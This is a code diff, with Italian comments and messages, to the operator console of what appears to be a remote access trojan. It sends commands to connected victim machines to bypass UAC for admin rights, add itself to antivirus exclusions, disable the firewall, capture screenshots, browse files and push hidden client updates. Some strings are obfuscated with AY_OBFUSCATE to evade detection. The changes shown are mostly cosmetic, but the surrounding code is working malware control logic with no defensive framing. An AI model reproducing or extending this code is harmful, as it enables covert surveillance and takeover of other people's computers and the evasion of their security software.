@@ -419,22 +419,6 @@ bool GetInfo(SOCKET Sock, int ID)
     return true;
 }
 
-bool InvertMouse(SOCKET Sock, int ID)
-{
-    string Status;
-
-    Status = COMUNICAZIONI::PingPong(Sock, "invertmouse");
-
-    if (Status == "a")
-        cout << "Tasti invertiti." << endl;
-    else if (Status == "b")
-        cout << "Tasti normali." << endl;
-    else
-        return false;
-
-    return true;
-}
-
 bool Reconnect(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Reconnect(Sock))
@@ -466,7 +450,7 @@ bool Shutdown(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Shutdown(Sock))
     {
-        cout << "Comando lanciato" << endl;
+        cout << "Comando lanciato.\n" << endl;
         Sleep(1500);
         return true;
     }
@@ -478,7 +462,7 @@ bool Reboot(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Reboot(Sock))
     {
-        cout << "Comando lanciato" << endl;
+        cout << "Comando lanciato.\n" << endl;
         Sleep(1500);
         return true;
     }
@@ -508,7 +492,7 @@ short UpdateClient(SOCKET Sock, int ID)
     cout << "Invio file in corso..." << endl;
     if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
     {
-        cout << "File inviato." << endl;
+        cout << "File inviato.\n" << endl;
         Sleep(1500);
         closesocket(Sock);
         Clients[ID].IsConnected = false;
@@ -1223,7 +1207,7 @@ short BypassUAC(SOCKET Sock, int ID)
 	if (Res == "OK")
 	{
         tc.SetColor(tc.Lime);
-		cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...") << endl;
+		cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...\n") << endl;
         tc.SetColor(tc.Default);
 		Sleep(1500);
         closesocket(Sock);
@@ -1234,16 +1218,32 @@ short BypassUAC(SOCKET Sock, int ID)
 	else if (Res == "NO")
 	{
         tc.SetColor(tc.Yellow);
-		cout << AY_OBFUSCATE("Bypass non riuscito.") << endl;
+		cout << AY_OBFUSCATE("Bypass non riuscito.\n") << endl;
         tc.SetColor(tc.Default);
 		return 1;
 	}
 	
     tc.SetColor(tc.Red);
-    cout << "Operazione bloccata dall'AV." << endl;
+    cout << "Operazione bloccata dall'AV.\n" << endl;
     tc.SetColor(tc.Default);
 
 	return 2;	
+}
+
+bool InvertMouse(SOCKET Sock, int ID)
+{
+    string Status;
+
+    Status = COMUNICAZIONI::PingPong(Sock, "invertmouse");
+
+    if (Status == "a")
+        cout << "Tasti invertiti.\n" << endl;
+    else if (Status == "b")
+        cout << "Tasti normali.\n" << endl;
+    else
+        return false;
+
+    return true;
 }
 
 bool VibeMouse(SOCKET Sock, int ID)
@@ -1253,9 +1253,9 @@ bool VibeMouse(SOCKET Sock, int ID)
     Status = COMUNICAZIONI::PingPong(Sock, "vibemouse");
 
     if (Status == "a")
-        cout << "Vibrazione attivata." << endl;
+        cout << "Vibrazione attivata.\n" << endl;
     else if (Status == "b")
-        cout << "Vibrazione disattivata." << endl;
+        cout << "Vibrazione disattivata.\n" << endl;
     else
         return false;
 
@@ -1264,14 +1264,23 @@ bool VibeMouse(SOCKET Sock, int ID)
 
 bool AddAVexclusion(SOCKET Sock, int ID)
 {
+    TextColor tc;
     string Status;
 
     Status = COMUNICAZIONI::PingPong(Sock, "addexclusion");
 
     if (Status == "ok")
-        cout << "Client aggiunto alle esclusioni dell'AV." << endl;
+    {
+        tc.SetColor(tc.Lime);
+        cout << "Client aggiunto alle esclusioni dell'AV.\n" << endl;
+        tc.SetColor(tc.Default);
+    }
     else if (Status == "ko")
-        cout << "Errore durante l'aggiunta del Client alle esclusioni." << endl;
+    {
+        tc.SetColor(tc.Red);
+        cout << "Errore durante l'aggiunta del Client alle esclusioni.\n" << endl;
+        tc.SetColor(tc.Default);
+    }
     else
         return false;
 
@@ -1280,14 +1289,23 @@ bool AddAVexclusion(SOCKET Sock, int ID)
 
 bool DisableFirewall(SOCKET Sock, int ID)
 {
+    TextColor tc;
     string Status;
 
     Status = COMUNICAZIONI::PingPong(Sock, "disablefw");
 
     if (Status == "ok")
-        cout << "Firewall disabilitato." << endl;
+    {
+        tc.SetColor(tc.Lime);
+        cout << "Firewall disabilitato.\n" << endl;
+        tc.SetColor(tc.Default);
+    }
     else if (Status == "ko")
-        cout << "Errore durante l'operazione." << endl;
+    {
+        tc.SetColor(tc.Red);
+        cout << "Errore durante l'operazione.\n" << endl;
+        tc.SetColor(tc.Default);
+    }
     else
         return false;
 
@@ -1347,10 +1365,14 @@ bool Screenshot(SOCKET Sock, int ID)
     string FileName = DateTime::GetDateTime('-', '_', '.') + ".jpg";
     string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;
 
+    cout << "Cattura in corso..." << endl;
+
     FileContent = COMUNICAZIONI::PingPong(Sock, "screenshot");
 
     if (FileContent == "")
         return false;
+
+    cout << "Immagine ricevuta!" << endl;
 
     if (!du.CheckDir(LocalFolder))
         if (!du.MakeDir(LocalFolder))
@@ -1386,6 +1408,7 @@ bool Screenshot(SOCKET Sock, int ID)
 
     return true;
 }
+
 
 void Sessione(int ID, SOCKET Sock)
 {
@@ -1426,7 +1449,7 @@ void Sessione(int ID, SOCKET Sock)
             StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
 			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
             StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
-            StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall."));
+            StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall (solo se Admin)."));
             cout << endl;
 
             cli.SubTitle("Desktop", 30, tc.SkyBlue);
